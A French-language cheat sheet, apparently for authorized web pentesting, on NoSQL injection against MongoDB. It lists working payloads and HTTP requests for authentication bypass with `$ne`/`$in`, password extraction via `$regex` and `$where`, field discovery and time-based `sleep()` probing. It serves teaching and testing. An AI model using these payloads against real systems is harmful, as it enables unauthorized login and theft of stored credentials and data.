# NoSQL Injection — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre l'exploitation des injections NoSQL, organisée autour de deux mécanismes fondamentaux et indépendants :

- **Injection par syntaxe** : rupture de la délimitation textuelle d'une expression de requête via des caractères spéciaux (`'`, `"`, `\`, `{`). Analogue à l'injection SQL classique.
- **Injection par opérateur** : substitution d'un objet structuré (JSON) à la place d'une chaîne attendue, permettant d'injecter des opérateurs natifs du moteur (`$ne`, `$regex`, `$where`…). Spécifique aux formats semi-structurés NoSQL.

**Moteur de référence :** MongoDB (opérateurs et exemples tirés du cours source). Les opérateurs, leur disponibilité et les comportements précis dépendent entièrement du moteur et de sa configuration — aucune technique ne doit être généralisée sans vérification sur la cible réelle.

**Outils :** Burp Suite (Repeater, Intruder), scripts Python (`requests`).

**Conditions générales :** tests applicables sur des endpoints dont l'entrée utilisateur alimente une requête NoSQL, en environnement de test autorisé.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.exemple` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `CHAMP` | Nom du champ MongoDB ciblé (`username`, `password`, `category`…) |
| `VALEUR` | Valeur de test ou préfixe en cours d'extraction (`a`, `ab`, etc.) |
| `^VALEUR.*` | Pattern `$regex` à construire itérativement pour l'extraction |

> **Principe fondamental :** un signal de détection (différence de réponse) n'est pas une preuve d'impact. Toujours distinguer : détection d'un comportement anormal → confirmation que l'entrée influence la logique → démonstration d'un impact concret (section 8).

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Détecter une injection par syntaxe | Soumettre `'`, `"`, `\`, `{` dans un champ | Début de tout test, paramètre GET ou champ de formulaire | Erreur ou réponse différente de la normale | Une erreur peut provenir d'une validation générique non liée à l'injection |
| Confirmer que l'entrée modifie la logique | Comparer `' && 0 && 'x` (faux) vs `' && 1 && 'x` (vrai) | Après observation d'un signal sur caractère spécial | Réponses distinctes et reproductibles entre les deux formes | Différence non reproductible = non concluant |
| Élargir un filtre (injection par syntaxe) | `'||'1'=='1` | Condition de filtrage sur une valeur | Tous les documents retournés au lieu d'un sous-ensemble | Dépend de la syntaxe d'expression textuelle utilisée par le moteur cible |
| Contourner une authentification (injection par opérateur) | `{"CHAMP": {"$ne": "invalid"}}` sur username ET password | Endpoint de login acceptant du JSON | Connexion réussie sans identifiants valides | Dépend du traitement d'un résultat multiple par l'application |
| Cibler un compte précis | `{"username": {"$in": ["admin", "administrator"]}}` | Contournement d'auth avec cible connue | Connexion sous le compte ciblé | Nécessite de connaître des noms de comptes probables |
| Extraire des données caractère par caractère (`$regex`) | `{"CHAMP": {"$regex": "^VALEUR.*"}}` | Injection par opérateur confirmée, réponse binaire observable | Comportement différent selon que le préfixe correspond ou non | Nécessite une distinction visible vrai/faux dans la réponse |
| Extraire un caractère via `$where` | `{"$where": "this.CHAMP[0] == 'a'"}` | `$where` disponible sur le moteur, extraction champ par champ | Comportement différent selon la valeur testée | Disponible uniquement si l'évaluation JavaScript est activée sur le moteur |
| Découvrir des noms de champs inconnus | `{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}` | Schéma de document inconnu, `$where` disponible | Réponse positive sur le nom du premier champ commençant par `a` | Dépend de la disponibilité de `$where` et de l'ordre des clés retourné |
| Injection temporelle (blind) | Condition `$where` avec `sleep()` ou boucle d'attente | Aucune distinction visible vrai/faux dans la réponse HTTP | Délai de réponse sensiblement supérieur à la baseline | `sleep()` non universel ; délai réseau peut masquer le signal |

---

## 3. Techniques classées par objectif

### 3.1 Détecter

#### Sondage par caractères spéciaux (injection par syntaxe)

**Objectif :** provoquer une réponse différente de la normale pour établir qu'une entrée atteint une expression de requête sans échappement.

**Quand l'utiliser :** en tout début de test, sur tout paramètre GET ou champ de formulaire.

**Prérequis :** aucun.

**Syntaxe minimale :**

```text
Tester successivement (un caractère à la fois) :
'   "   \   {
```

**Éléments à personnaliser :** injecter dans chaque champ modifiable séparément.

**Signal attendu :** erreur serveur, message d'erreur applicatif, ou différence de contenu/code HTTP par rapport à une soumission normale.

**Interprétation :** une réponse différente suggère que le caractère spécial atteint l'expression de requête sans être neutralisé. Une erreur générique (400, validation de formulaire) ne suffit pas à confirmer une injection — vérifier si la différence est spécifique au caractère envoyé.

**Limites :** une validation générique non liée à NoSQL peut provoquer la même différence ; passer à la confirmation (section 3.2) avant de conclure.

**Source :** cours fourni, sections 7.1 et 9.

#### Sondage par soumission d'objet JSON (injection par opérateur)

**Objectif :** établir que l'application accepte un objet à la place d'une chaîne attendue sans rejeter l'entrée.

**Quand l'utiliser :** endpoint acceptant du JSON (login, recherche, filtrage).

**Prérequis :** requête JSON interceptée dans Burp Suite.

**Syntaxe minimale :**

```json
{"username": {"$ne": "invalid"}, "password": "test"}
```

**Éléments à personnaliser :** `username` / `password` selon le champ cible ; tester d'abord sur un seul champ.

**Signal attendu :** la requête n'est pas rejetée (pas de 400 « type inattendu ») et le comportement applicatif change.

**Interprétation :** l'absence de rejet indique que l'application ne valide pas le type du champ reçu avant de le transmettre au moteur. Cela ne prouve pas encore que l'opérateur est interprété — passer à la confirmation ci-dessous.

**Source :** cours fourni, sections 4 et 7.2.

---

### 3.2 Confirmer

#### Confirmation par paire vraie/fausse (injection par syntaxe)

**Objectif :** démontrer que l'entrée modifie effectivement la logique de la requête, et non qu'elle provoque simplement un rejet ou une erreur.

**Quand l'utiliser :** après observation d'un signal sur caractère spécial.

**Prérequis :** un signal initial observable (différence de réponse) identifié à l'étape de détection.

**Syntaxe minimale :**

```text
Condition manifestement fausse : ' && 0 && 'x
Condition manifestement vraie  : ' && 1 && 'x
```

**Éléments à personnaliser :** adapter la syntaxe à l'expression de requête utilisée par le moteur cible (les opérateurs logiques `&&` et `||` correspondent à un contexte JavaScript/MongoDB — vérifier si le moteur cible utilise cette syntaxe).

**Signal attendu :** réponses distinctes et reproductibles entre les deux formes (contenu différent, code HTTP différent, taille différente).

**Interprétation :** une différence cohérente et reproductible confirme que l'entrée influence la logique de la requête côté serveur. Une différence non reproductible ou non corrélée aux deux formes ne permet pas de conclure.

**Limites :** tester plusieurs fois chaque forme pour écarter un comportement non déterministe de l'application.

**Source :** cours fourni, sections 6 et 7.1.

#### Confirmation de l'interprétation d'opérateur (injection par opérateur)

**Objectif :** vérifier que l'opérateur injecté est réellement interprété par le moteur et non simplement ignoré.

**Quand l'utiliser :** après avoir confirmé que l'application accepte l'objet JSON sans rejet.

**Prérequis :** endpoint dont le comportement (login réussi / échoué, données retournées / non retournées) est observable.

**Syntaxe minimale :**

```json
{"CHAMP": {"$ne": "aaaaa_valeur_manifestement_absente_de_la_base"}}
```

**Signal attendu :** la condition `$ne` correspond à tous les documents existants (puisque aucun ne contient cette valeur absurde), produisant un résultat positif (connexion réussie, données retournées) là où une chaîne invalide produirait un résultat négatif.

**Interprétation :** si le comportement diffère entre `{"CHAMP": "aaaaa_..."}` (chaîne) et `{"CHAMP": {"$ne": "aaaaa_..."}}` (opérateur), l'opérateur est bien interprété par le moteur.

**Source :** cours fourni, sections 4, 6 et 7.2.

---

### 3.3 Exploiter — Contournement de condition et d'authentification

#### Élargissement de filtre (injection par syntaxe)

**Objectif :** transformer une condition de filtre en condition toujours vraie pour obtenir tous les documents au lieu d'un sous-ensemble.

**Quand l'utiliser :** injection par syntaxe confirmée (paire vraie/fausse distinguable), endpoint de filtrage ou de recherche.

**Prérequis :** syntaxe d'expression textuelle confirmée.

**Syntaxe minimale :**

```text
'||'1'=='1
```

**Comment ça fonctionne :**

```text
Requête voulue    : this.category == 'fizzy'
Entrée injectée   : fizzy'||'1'=='1
Requête résultante: this.category == 'fizzy' || '1' == '1'
```

La disjonction logique avec `'1'=='1` (toujours vraie) étend la sélection à tous les documents.

**Signal attendu :** l'ensemble des documents est retourné au lieu du seul sous-ensemble filtré.

**Limites :** la syntaxe exacte dépend du moteur et de la façon dont l'application construit l'expression — `||` est valide dans un contexte JavaScript/MongoDB ; adapter si le moteur utilise une autre syntaxe.

**Source :** cours fourni, section 7.1.

#### Contournement d'authentification (`$ne`)

**Objectif :** s'authentifier sans connaître les identifiants d'un compte en faisant correspondre la requête à n'importe quel document existant.

**Quand l'utiliser :** injection par opérateur confirmée sur un endpoint de login acceptant JSON.

**Prérequis :** l'application utilise le premier résultat de la requête comme authentification valide.

**Syntaxe minimale :**

```json
{
  "username": {"$ne": "invalid"},
  "password": {"$ne": "invalid"}
}
```

**Variante — ciblage d'un compte précis :**

```json
{
  "username": {"$in": ["admin", "administrator", "root"]},
  "password": {"$ne": "invalid"}
}
```

**Signal attendu :** connexion réussie (redirection vers espace authentifié, token de session, ou contenu réservé).

**Interprétation :** confirme le contournement d'authentification. Sans ciblage `$in`, le compte retourné est le premier trouvé dans la base — non prévisible sans information complémentaire.

**Limites :** échoue si l'application vérifie qu'un seul document correspond exactement, ou applique une vérification supplémentaire après la requête.

**Source :** cours fourni, sections 7.2 et 8.

---

### 3.4 Extraire des données — Injection par opérateur

#### Extraction caractère par caractère via `$regex`

**Objectif :** reconstituer la valeur d'un champ en testant des préfixes de plus en plus longs et en observant la réponse.

**Quand l'utiliser :** injection par opérateur confirmée, distinction observable vrai/faux dans la réponse HTTP.

**Prérequis :** le champ cible existe et contient une valeur ; l'application distingue visiblement un résultat positif d'un résultat négatif.

**Méthode itérative :**

```text
Test 1 : {"CHAMP": {"$regex": "^a.*"}} → vrai = commence par 'a', faux = pas 'a'
Test 2 (si vrai) : {"CHAMP": {"$regex": "^ab.*"}} → confirme le second caractère
Test 2 (si faux) : {"CHAMP": {"$regex": "^b.*"}} → teste le caractère suivant
...
Répéter jusqu'à obtenir la chaîne complète (plus aucun préfixe ajouté ne produit un vrai)
```

**Syntaxe minimale pour un test :**

```json
{"password": {"$regex": "^a.*"}}
```

**Signal attendu :** réponse « positive » (login réussi, contenu retourné) si le champ commence par `a` ; réponse « négative » (erreur de login, contenu vide) sinon.

**Limites :** lent (un caractère à la fois) ; peut être bloqué par un rate-limiting ; nécessite une distinction stable vrai/faux dans la réponse — en son absence, passer à l'injection temporelle (section 3.6).

**Source :** cours fourni, sections 5.3, 7.2 et 8.

#### Extraction via `$where` (JavaScript)

**Objectif :** accéder à la valeur d'un champ caractère par caractère via une expression JavaScript évaluée côté moteur.

**Quand l'utiliser :** `$where` disponible et activé sur le moteur, injection par opérateur confirmée.

**Prérequis :** disponibilité de l'évaluation JavaScript (`$where`) dans la configuration du moteur — à ne pas supposer.

**Syntaxe minimale (extraction d'un caractère) :**

```json
{"$where": "this.CHAMP[0] == 'a'"}
```

**Variante — détection d'un pattern sans révéler la valeur :**

```json
{"$where": "this.CHAMP.match(/\\d/)"}
```

**Signal attendu :** comportement différent (réponse positive vs négative) selon que la condition JavaScript est vraie ou fausse.

**Différence avec `$regex` :** `$where` évalue du code JavaScript arbitraire, permettant des tests structurels (accès par index, test de méthodes) que `$regex` ne supporte pas. Disponible uniquement si le moteur l'autorise.

**Limites :** désactivé dans de nombreuses configurations modernes ; non disponible sur tous les moteurs NoSQL.

**Source :** cours fourni, section 7.3.

#### Découverte de noms de champs inconnus via `$where`

**Objectif :** identifier les noms de champs présents dans les documents sans connaître le schéma a priori.

**Quand l'utiliser :** `$where` disponible, schéma de la base inconnu (documents sans structure fixe).

**Syntaxe minimale :**

```json
{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}
```

**Comment l'adapter pour itérer :**

```text
Trouver le premier champ commençant par 'a' :
  Object.keys(this)[0].match('^.{0}a.*')

Trouver le premier champ commençant par 'b' :
  Object.keys(this)[0].match('^.{0}b.*')

Trouver le second champ commençant par 'u' :
  Object.keys(this)[1].match('^.{0}u.*')
```

**Signal attendu :** réponse positive pour un nom de champ correspondant au pattern, negative sinon.

**Limites :** `Object.keys(this)` retourne les champs dans un ordre dépendant de l'implémentation, non nécessairement alphabétique ou prévisible ; à combiner avec une wordlist de noms de champs courants pour accélérer la découverte.

**Source :** cours fourni, section 7.3.

---

### 3.5 Diagnostiquer — Injection basée sur le temps

**Objectif :** confirmer une injection ou extraire des données lorsque la réponse HTTP ne distingue pas visuellement une condition vraie d'une condition fausse.

**Quand l'utiliser :** aucune différence de contenu ou de code HTTP observable entre conditions vraie et fausse ; `$where` (ou équivalent avec `sleep()`) disponible sur le moteur.

**Prérequis :** établir une baseline fiable (plusieurs requêtes sans payload) avant tout test ; `sleep()` ou une boucle d'attente disponible dans l'environnement JavaScript du moteur (non universel).

**Syntaxe minimale (confirmation d'exécution) :**

```json
{"$where": "sleep(2000) || true"}
```

**Syntaxe pour extraction conditionnelle :**

```json
{"$where": "this.CHAMP[0] == 'a' && sleep(2000) || true"}
```

**Éléments à personnaliser :** `2000` (délai en ms, à ajuster selon la baseline), `CHAMP`, caractère testé.

**Signal attendu :** délai d'environ 2 secondes si la condition est vraie (le `sleep` est exécuté) ; délai normal si la condition est fausse (court-circuit logique).

**Interprétation :** un délai reproductible et cohérent avec la valeur passée à `sleep()` confirme l'exécution de l'expression JavaScript. Un délai isolé et non reproductible est insuffisant — toujours répéter plusieurs fois et comparer à la baseline.

**Limites :** fortement sensible au bruit réseau et à la charge serveur ; `sleep()` peut ne pas être disponible dans l'environnement d'exécution du moteur ; de nombreuses configurations modernes limitent le temps d'exécution des requêtes.

**Source :** cours fourni, sections 7.4 et 9.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Sonde de détection syntaxique | `'` | Paramètre GET ou champ JSON | `"`, `\`, `{` | Chaque caractère cible un mécanisme de délimitation différent — tester un par un |
| Confirmation paire fausse/vraie | `' && 0 && 'x` / `' && 1 && 'x` | Paramètre GET ou valeur de champ JSON | — | Les deux formes doivent être testées dans le même champ pour comparer les réponses |
| Élargissement de filtre | `'||'1'=='1` | Valeur d'un paramètre de filtrage textuel | — | Un seul payload de référence ; adapter la syntaxe au moteur si ce n'est pas du JavaScript |
| Auth bypass générique | `{"$ne": "invalid"}` sur username + password | Corps JSON d'un endpoint de login | `{"$gt": ""}` (différent de vide) | `$gt: ""` correspond à toute chaîne non vide — alternative si `$ne` est filtré |
| Auth bypass ciblé | `{"$in": ["admin", "administrator"]}` sur username | Corps JSON, champ username uniquement | Étendre la liste `$in` selon l'OSINT | La liste est la seule variable à adapter |
| Extraction `$regex` (un caractère) | `{"$regex": "^a.*"}` | Corps JSON, champ à extraire | Itérer sur `^a.*`, `^b.*`… puis `^aa.*`, `^ab.*`… | Chaque test isole un caractère — ne changer que le préfixe testé à chaque itération |
| Extraction `$where` (index) | `{"$where": "this.CHAMP[0] == 'a'"}` | Corps JSON, champ `$where` | Incrémenter l'index `[0]`, `[1]`… | L'index est la seule variable entre deux tests sur le même champ |
| Découverte de champ | `{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}` | Corps JSON, champ `$where` | Incrémenter `[0]` en `[1]`, `[2]`… | L'index du champ est la seule variable entre deux tests |
| Injection temporelle | `{"$where": "this.CHAMP[0] == 'a' && sleep(2000) \|\| true"}` | Corps JSON, champ `$where` | Supprimer la condition (sleep sans if) pour confirmer l'exécution seule | La suppression de la condition isole la disponibilité de `sleep()` de l'extraction |

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Représentation alternative | Contexte pertinent | Composant décodant | Effet attendu |
|---|---|---|---|---|
| Apostrophe `'` brute | `%27` (encodée URL) | Paramètre GET dans l'URL | Serveur web avant transmission à l'application | Contourne un filtre texte sur `'` brute sans empêcher l'interprétation par le parseur de requête |
| Null byte `\u0000` | `%00` (encodé URL) | Paramètre GET | Moteur NoSQL / pilote | Peut tronquer le traitement d'une chaîne après le null byte, selon l'implémentation — non universel |
| Objet JSON `{"$ne": "..."}` | Soumis directement dans le corps JSON | Corps de requête `Content-Type: application/json` | Désérialiseur JSON de l'application | Nécessite que le point d'entrée accepte du JSON ; inefficace si le parseur convertit l'objet en chaîne avant transmission |
| Chaîne JSON `"..."` dans un corps `application/x-www-form-urlencoded` | `CHAMP[$ne]=invalid` | Corps de formulaire | Application PHP/Node.js construisant un objet à partir des paramètres de formulaire | Certains frameworks reconstruisent un objet `{$ne: "invalid"}` à partir de cette syntaxe de paramètre |

**Condition d'inefficacité :** si l'application convertit systématiquement tout objet reçu en chaîne (`(string)$_POST['username']` en PHP, `.toString()` en JavaScript) avant de le transmettre au moteur, l'injection par opérateur est structurellement fermée — passer à l'injection par syntaxe si applicable.

---

## 6. Exemples de requêtes HTTP

### 6.1 Détection par caractère spécial (injection par syntaxe, GET)

```http
# Référence — requête légitime
GET /products?category=fizzy HTTP/1.1
Host: cible.exemple
```

```http
# Version modifiée — sonde avec apostrophe
GET /products?category=fizzy' HTTP/1.1
Host: cible.exemple
```

- **Changement clé :** apostrophe ajoutée à la fin de la valeur.
- **Pourquoi important :** si la valeur est insérée par concaténation dans une expression textuelle, l'apostrophe rompt la délimitation.
- **Signal recherché :** erreur serveur, message d'erreur applicatif, ou différence de contenu/code HTTP.
- **Ce que cela ne prouve pas seul :** qu'une injection est exploitable — passer à la confirmation par paire vraie/fausse.

### 6.2 Confirmation paire fausse/vraie (injection par syntaxe, GET)

```http
# Condition fausse
GET /products?category=fizzy'%20%26%26%200%20%26%26%20'x HTTP/1.1
Host: cible.exemple
```

```http
# Condition vraie
GET /products?category=fizzy'%20%26%26%201%20%26%26%20'x HTTP/1.1
Host: cible.exemple
```

- **Changement clé :** `0` vs `1` dans la condition injectée (`&&` encodés `%20%26%26%20`).
- **Signal recherché :** réponses nettement différentes et reproductibles entre les deux formes.
- **Ce que cela ne prouve pas seul :** l'exploitabilité complète — confirme uniquement que l'entrée modifie la logique de la requête.

### 6.3 Contournement d'authentification (injection par opérateur, JSON POST)

```http
# Référence — requête de login légitime
POST /login HTTP/1.1
Host: cible.exemple
Content-Type: application/json

{"username": "wiener", "password": "peter"}
```

```http
# Version modifiée — injection $ne sur les deux champs
POST /login HTTP/1.1
Host: cible.exemple
Content-Type: application/json

{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

- **Changement clé :** les valeurs de chaîne remplacées par des objets contenant `$ne`.
- **Prérequis :** le point d'entrée accepte du JSON sans conversion de type.
- **Signal recherché :** connexion réussie (session, token, redirection vers espace authentifié).
- **Ce que cela ne prouve pas seul :** l'identité du compte retourné — le premier document correspondant est retourné, non nécessairement un administrateur.

### 6.4 Extraction `$regex` caractère par caractère (injection par opérateur, JSON POST)

```http
# Test : le mot de passe de 'admin' commence-t-il par 'a' ?
POST /login HTTP/1.1
Host: cible.exemple
Content-Type: application/json

{"username": "admin", "password": {"$regex": "^a.*"}}
```

- **Changement clé :** `password` remplacé par un objet `$regex` avec un préfixe à tester.
- **Itération :** modifier uniquement le préfixe (`^a.*`, `^b.*`… puis `^aa.*`…) — conserver le reste identique.
- **Signal recherché :** réponse « connexion réussie » si le préfixe correspond, « échec » sinon.
- **Ce que cela ne prouve pas seul :** la valeur complète du mot de passe — une correspondance de préfixe indique uniquement que les caractères testés sont corrects.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle et renvoi de requêtes unitaires | Sondage initial, tests de confirmation paire vraie/fausse, contournement d'auth | Modifier le champ JSON, comparer les réponses | Peu adapté à l'extraction automatisée caractère par caractère |
| Burp Intruder | Automatisation d'un payload variable sur une position | Extraction `$regex` / `$where` caractère par caractère | Positionner sur le caractère testé (`^§a§.*`), charger un alphabet, observer les différences de réponse | Nécessite un critère de distinction fiable (taille, code, contenu) pour trier les résultats |
| Python `requests` | Script d'extraction automatisée | Extraction `$regex` ou `$where` sur un alphabet connu | Boucle sur l'alphabet, comparer `r.status_code` ou `len(r.text)` entre requêtes | Dépend de la stabilité de la réponse observable ; ajouter un délai entre requêtes si rate-limiting |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Erreur ou réponse différente sur `'`, `"`, `\` ou `{` | Caractère spécial atteignant une expression de requête sans échappement | Tester la paire fausse/vraie pour confirmer que l'entrée modifie la logique | Qu'une injection est exploitable — l'erreur peut provenir d'une validation générique sans lien |
| Réponses distinctes entre `' && 0 && 'x` et `' && 1 && 'x` | Injection par syntaxe confirmée : l'entrée modifie effectivement la logique | Reproduire plusieurs fois chaque forme pour confirmer la cohérence | Qu'une injection confirme automatiquement un impact — cela confirme uniquement l'influence sur la requête |
| Connexion réussie avec `{"$ne": "invalid"}` sur username + password | Injection par opérateur confirmée, contournement d'authentification | Identifier le compte retourné (via l'interface ou un appel au profil) | Que le compte retourné est nécessairement un administrateur |
| Réponse positive sur `{"$regex": "^a.*"}` | Le champ commence par `a` | Itérer sur le second caractère pour confirmer avant de conclure sur le premier | Qu'un seul résultat positif confirme toute la valeur |
| Délai de réponse sensiblement supérieur à la baseline avec `sleep()` | Expression JavaScript évaluée par le moteur, `sleep()` disponible | Répéter plusieurs fois et faire varier la durée (`sleep(1000)` vs `sleep(3000)`) pour confirmer la corrélation | Qu'un délai isolé confirme l'injection — le bruit réseau peut produire le même effet |
| Réponse positive sur `Object.keys(this)[0].match('^.{0}a.*')` | Premier champ du document commençant par `a` | Tester les autres positions (`[1]`, `[2]`…) et d'autres lettres pour cartographier les champs | Que le premier champ retourné est dans un ordre prévisible — l'ordre dépend de l'implémentation |

**Contrôle comparatif systématique :** pour tout test, toujours envoyer d'abord la version « neutre » (valeur normale de référence) puis la version modifiée, et documenter la différence avant de conclure. Une seule observation isolée n'est jamais suffisante.

---

## 9. Variantes de syntaxe et adaptation

#### Adapter l'injection par opérateur à un corps de formulaire (non JSON)

**Problème précis :** le point d'entrée est un formulaire HTML encodé `application/x-www-form-urlencoded` et non un corps JSON.

**Pourquoi pertinent :** certains frameworks PHP/Node.js reconstruisent un objet à partir de la syntaxe de paramètre de tableau.

**Ce qui change :** format d'encodage du corps de la requête.

```text
# Format JSON (référence)
{"username": {"$ne": "invalid"}}

# Équivalent formulaire (à tester si le framework le supporte)
username[$ne]=invalid
```

**Ce qu'il faut conserver identique :** l'opérateur et la valeur ; seul le format d'encodage change.

**Nouveau signal attendu :** même comportement que l'injection JSON si le framework reconstruit l'objet.

**Limites :** dépend du framework côté serveur — ne pas supposer la compatibilité sans vérification empirique.

#### Substituer `$gt: ""` à `$ne: "invalid"` si `$ne` est filtré

**Problème précis :** `$ne` est explicitement filtré côté serveur.

**Pourquoi pertinent :** `$gt: ""` (supérieur à une chaîne vide) correspond à toute chaîne non vide stockée, produisant un effet similaire.

**Ce qui change :** uniquement l'opérateur.

```json
{"password": {"$gt": ""}}
```

**Ce qu'il faut conserver identique :** la structure de l'objet et le champ ciblé.

**Limites :** l'opérateur `$gt` n'est pas disponible sur tous les moteurs NoSQL avec le même comportement.

#### Passer à `$where` si `$regex` est insuffisant

**Problème précis :** `$regex` est filtré ou le champ n'est pas une chaîne compatible avec la syntaxe regex.

**Ce qui change :** technique d'extraction ; le mécanisme devient une évaluation JavaScript plutôt qu'un opérateur déclaratif.

```json
{"$where": "this.CHAMP[0] == 'a'"}
```

**Prérequis supplémentaire :** `$where` activé sur le moteur — à confirmer avant de passer à cette variante.

> **Règle importante :** ne changer qu'une seule variable à la fois (opérateur, champ, caractère testé, délai). Modifier simultanément plusieurs éléments rend le résultat ininterprétable.

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucune différence sur `'`, `"`, `\`, `{` | Validation côté serveur, échappement correct, ou moteur insensible à ce caractère dans ce contexte | Tester l'injection par opérateur indépendamment | Passer au sondage JSON (`{"$ne": "..."}`) | Que l'injection par syntaxe n'est pas exploitable ici, pas que l'endpoint est totalement sûr |
| Paire fausse/vraie sans différence reproductible | Comportement non déterministe, ou injection syntaxique sans effet réel | Répéter chaque forme plusieurs fois ; vérifier que la syntaxe correspond au moteur cible | Ajuster la syntaxe d'expression logique (`&&`, `\|\|`) selon le moteur | Que l'absence de différence reproducible ne confirme pas la sécurité — peut indiquer une syntaxe inadaptée |
| Corps JSON avec `{"$ne": ...}` rejeté (400) | Validation de type côté serveur (l'application rejette les objets là où elle attend des chaînes) | Vérifier le message d'erreur exact (« type invalide » vs autre) | Tenter la variante formulaire `champ[$ne]=...` | Que la validation de type est présente côté serveur — pas que l'endpoint est protégé contre l'injection par syntaxe |
| `$regex` sans effet (pas de différence faux/vrai) | Champ non exposé à l'opérateur, ou application ne distinguant pas les résultats | Vérifier que le champ ciblé est bien celui utilisé dans la requête de comparaison | Passer à `$where` ou à l'injection temporelle | Que `$regex` seul ne confirme pas la protection si `$where` ou le time-based n'a pas été testé |
| `$where` rejeté ou sans effet | `$where` désactivé dans la configuration du moteur | Tester `$regex` pour confirmer que l'injection par opérateur fonctionne sur d'autres opérateurs | Revenir à `$regex` pour l'extraction | Que `$where` n'est pas disponible ici — pas que l'injection par opérateur est fermée globalement |
| Délai non reproductible avec `sleep()` | Bruit réseau, `sleep()` non disponible, ou charge serveur variable | Répéter la mesure plusieurs fois et comparer à la baseline sans payload | Augmenter la durée (`sleep(5000)`) pour rendre le signal plus net | Qu'un délai isolé ne confirme pas l'injection — seule une corrélation reproductible avec la valeur de délai est probante |
| Extraction `$regex` incohérente (plusieurs caractères semblent correspondre) | Insensibilité à la casse activée sur le moteur, ou champ non unique | Vérifier si `$options: "i"` est implicitement appliqué ; tester sur un champ connu | Adapter le pattern en ciblant la casse explicitement | Que le résultat d'extraction `$regex` seul ne peut pas être généralisé sans connaître la configuration de collation |

---

## 11. Checklist d'utilisation

- [ ] La nature du mécanisme soupçonné est identifiée : injection par syntaxe (expression textuelle) ou injection par opérateur (objet JSON accepté à la place d'une chaîne).
- [ ] Pour l'injection par syntaxe : le sondage par caractère spécial a été effectué sur chaque champ modifiable.
- [ ] La confirmation par paire fausse/vraie a été réalisée et reproduite avant de conclure à une injection.
- [ ] Pour l'injection par opérateur : le rejet (ou l'absence de rejet) d'un objet JSON a été vérifié sur le champ cible.
- [ ] Le moteur NoSQL cible a été identifié (ou est connu) avant d'utiliser des opérateurs spécifiques (`$ne`, `$regex`, `$where`).
- [ ] L'extraction `$regex` ou `$where` est tentée caractère par caractère, en ne changeant que le préfixe ou le caractère testé à chaque itération.
- [ ] Une baseline de temps de réponse est établie avant tout test temporel.
- [ ] Un délai ou une différence isolée non reproductible n'est pas documenté comme preuve d'injection.
- [ ] Chaque impact allégué (contournement d'auth, donnée extraite) est confirmé par une répétition du test.
- [ ] Les techniques dépendant d'une configuration spécifique (`$where`, `sleep()`) sont explicitement identifiées comme conditionnelles dans le rapport.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
  Ressource de référence directe couvrant la détection par caractères spéciaux, l'injection d'opérateurs MongoDB, l'extraction via `$regex` et `$where`, et les techniques basées sur le temps (source citée dans le cours fourni).
- Documentation officielle MongoDB — Opérateurs de requête : `$ne`, `$gt`, `$in`, `$regex`, `$where`
  À consulter pour confirmer la disponibilité et le comportement précis de chaque opérateur sur la version du moteur effectivement utilisée par la cible.
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
  Catégorie de référence incluant les injections NoSQL aux côtés des injections SQL et de commandes OS.
